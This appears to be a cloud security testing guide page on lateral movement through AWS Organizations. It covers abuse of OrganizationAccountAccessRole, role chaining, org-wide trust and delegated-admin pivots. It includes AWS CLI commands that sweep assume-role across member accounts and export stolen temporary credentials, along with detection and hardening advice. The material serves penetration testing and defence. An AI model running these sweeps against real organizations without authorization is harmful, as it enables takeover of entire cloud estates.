---
cstg_id: CSTG-AWS-ORGANIZATIONS-LATERAL
title: "AWS Organizations - Lateral Movement"
provider: aws
service: organizations
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - sts:AssumeRole
  - organizations:ListAccounts
  - organizations:DescribeOrganization
  - iam:ListRoles
  - iam:GetRole
  - iam:ListAccountAliases
tools:
  - AWS CLI
  - AWS SDK
  - graph-based IAM analysis tooling
  - cross-account role enumeration tooling
references:
  - https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_accounts_access.html
  - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-api.html
  - https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
  - https://hackingthe.cloud/aws/post_exploitation/iam_privesc_by_attachment/
  - https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/
license: CC BY-SA 4.0
---

## Summary

AWS Organizations creates implicit trust between accounts that an attacker can ride to move laterally. The canonical path is the **`OrganizationAccountAccessRole`**: when Organizations creates a member account, it provisions an IAM role in that account that trusts the **management account** and grants `AdministratorAccess`. A principal in the management account with `sts:AssumeRole` can therefore "switch role" into *any* member account with full admin — turning management-account access into control of the entire estate.

Lateral movement also flows through **delegated-administrator** relationships (an account with org-wide authority over a security service), through **shared/automation roles** that trust other org accounts, and through the consolidated trust that account-creation establishes. Because all member accounts share an organization, cross-account roles are common and frequently over-trusting (e.g. trusting the whole org or an entire account root rather than a specific principal).

This page assumes an assumed-breach foothold and focuses on enumerating and exercising cross-account trust within the org. See CSTG-AWS-ORGANIZATIONS-ENUM for mapping the account inventory and CSTG-AWS-ORGANIZATIONS-PRIVESC for using these paths to reach the SCP-exempt management account.

## Prerequisites

- An assumed-breach principal with `sts:AssumeRole`.
- A target role ARN in another account whose trust policy permits the current principal. The highest-value case is a principal in the **management account** assuming `OrganizationAccountAccessRole` in member accounts.
- The account inventory (from CSTG-AWS-ORGANIZATIONS-ENUM) to know which accounts to target.

## Enumeration

### Build the target account list

From the management account or a delegated admin:

```bash
aws organizations list-accounts \
  --query 'Accounts[?Status==`ACTIVE`].[Id,Name,Email]' --output text
```

From a member account where Organizations enumeration is denied, harvest target account IDs from other sources: CloudTrail records, Resource Access Manager shares, VPC peering/Transit Gateway attachments, ECR/S3 resource policies, `ram list-resources`, and any hardcoded account IDs in code, SSM parameters, or environment variables.

### Identify assumable cross-account roles

The cross-account admin role created by Organizations is conventionally named `OrganizationAccountAccessRole` (or `OVMAccessRole` for accounts migrated in). For each target account, test assumption directly:

```bash
for acct in 222222222222 333333333333 444444444444; do
  aws sts assume-role \
    --role-arn arn:aws:iam::${acct}:role/OrganizationAccountAccessRole \
    --role-session-name audit 2>&1 | head -2
done
```

A successful response returns temporary credentials; `AccessDenied` indicates the trust does not permit the caller or the role name differs. Role-name enumeration via trust-policy probing is a known technique — see the Rhino Security Labs reference.

Within an account you already hold, find roles that trust other org accounts (outbound lateral paths) or that this account trusts (inbound):

```bash
aws iam list-roles \
  --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}' \
  --output json
```

Look for trust statements with `Principal.AWS` set to another account root (`arn:aws:iam::OTHER:root`), to `*` with an `aws:PrincipalOrgID` condition (trusts the entire org), or to `organizations.amazonaws.com` / service principals.

## Misconfigurations & Findings

- **`OrganizationAccountAccessRole` present with default admin trust** in member accounts (expected, but it makes management-account compromise total).
- **Cross-account roles trusting an entire account root** (`:root`) instead of a specific principal, so any principal in the trusted account can assume them.
- **Roles trusting `aws:PrincipalOrgID` broadly**, granting every principal in every org account a path in.
- **Delegated-administrator accounts** that can reach security data and configuration across all accounts.
- **No `sts:ExternalId` or condition constraints** on cross-account trust, enabling confused-deputy abuse.
- **Long session durations / no MFA condition** on high-privilege cross-account roles.

## Exploitation

### sts:AssumeRole into a member account (management → member)

The primary path. From the management account, assume the org access role in a target member account and export the temporary credentials:

```bash
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::222222222222:role/OrganizationAccountAccessRole \
  --role-session-name audit --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .Credentials.AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .Credentials.SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .Credentials.SessionToken)

aws sts get-caller-identity   # now operating in 222222222222 as admin
```

Repeat across the account list to gain admin in every member account — a single management-account compromise becomes full estate compromise.

### Role chaining across accounts

Member accounts often trust each other (shared-services, CI/CD, logging). After landing in one account, enumerate its roles and chain into the next account it trusts. Note AWS limits role-chained sessions to a maximum 1-hour duration, so chains must re-assume periodically:

```bash
# in account A, assume a role that B's role trusts, then assume into B, etc.
aws sts assume-role --role-arn arn:aws:iam::333333333333:role/cicd-deploy \
  --role-session-name audit
```

### Org-wide trust abuse (aws:PrincipalOrgID)

If a role trusts any principal with a matching `aws:PrincipalOrgID`, a foothold in *any* org account can assume it. Enumerate such roles and use the weakest-controlled account as the launch point:

```bash
aws iam list-roles --query \
  'Roles[?contains(to_string(AssumeRolePolicyDocument), `PrincipalOrgID`)].RoleName'
```

### Delegated-administrator pivot

From a delegated-administrator account, the service's org-wide APIs become a lateral channel — for example reading findings, member configurations, and (with write access) reconfiguring the service across all accounts:

```bash
aws guardduty list-members --detector-id <id>
aws securityhub list-members
aws config describe-organization-config-rules
```

### Account creation as a movement primitive

If `organizations:CreateAccount` is available (see CSTG-AWS-ORGANIZATIONS-PRIVESC), creating a new account yields a fresh admin role trusting the management account — an attacker-controlled landing zone inside the trust boundary that can then be used as a staging account for further movement.

## Detection & Logging

- **`AssumeRole` events** are recorded in CloudTrail in *both* the calling account and the target account. Cross-account assumptions of `OrganizationAccountAccessRole` show `sourceIPAddress`, the management-account principal in `userIdentity`, and the assumed session in the target account's trail.
- Organizations API calls (`ListAccounts`, `CreateAccount`) appear in the **management-account** trail (`us-east-1`).
- An organization CloudTrail centralizes all member-account `AssumeRole` activity.

Detection guidance:

- Alert on assumptions of `OrganizationAccountAccessRole` (and any break-glass cross-account admin role) — these should be rare and tied to known operators.
- Baseline normal cross-account `AssumeRole` source principals; flag fan-out patterns where one principal assumes roles across many accounts in a short window (the lateral sweep above).
- Watch for role-chaining (repeated 1-hour `AssumeRole` renewals) and assumptions originating from unexpected IPs/sessions.
- GuardDuty findings such as `UnauthorizedAccess` / anomalous `AssumeRole` behavior aid detection.

## Remediation & Hardening

- Scope cross-account trust to specific principals, not account roots or broad `aws:PrincipalOrgID`; add `sts:ExternalId` and MFA/condition constraints where appropriate.
- Treat `OrganizationAccountAccessRole` as break-glass: consider removing or renaming it, restricting who in the management account may assume it, requiring MFA, and alerting on every use.
- Keep the management account locked down — its compromise transitively compromises every member account through this role.
- Use SCPs to deny use of unexpected cross-account roles and to constrain `sts:AssumeRole` where feasible.
- Continuously enumerate and review cross-account trust relationships across the org; minimize role chaining.
- Enable an organization CloudTrail and GuardDuty across all accounts for centralized detection.

## Tools

- AWS CLI (`aws sts assume-role`, `aws iam list-roles`, `aws organizations`) and SDKs.
- Graph-based IAM analysis tooling to map cross-account assume paths across the entire org.
- Cross-account role enumeration tooling that probes trust policies for assumable roles.

## References

- Accessing and administering member accounts — https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_accounts_access.html
- Switching to a role (API) — https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-api.html
- STS AssumeRole API — https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
- hackingthe.cloud — IAM privilege escalation — https://hackingthe.cloud/aws/post_exploitation/iam_privesc_by_attachment/
- Rhino Security Labs — AssumeRole enumeration — https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/
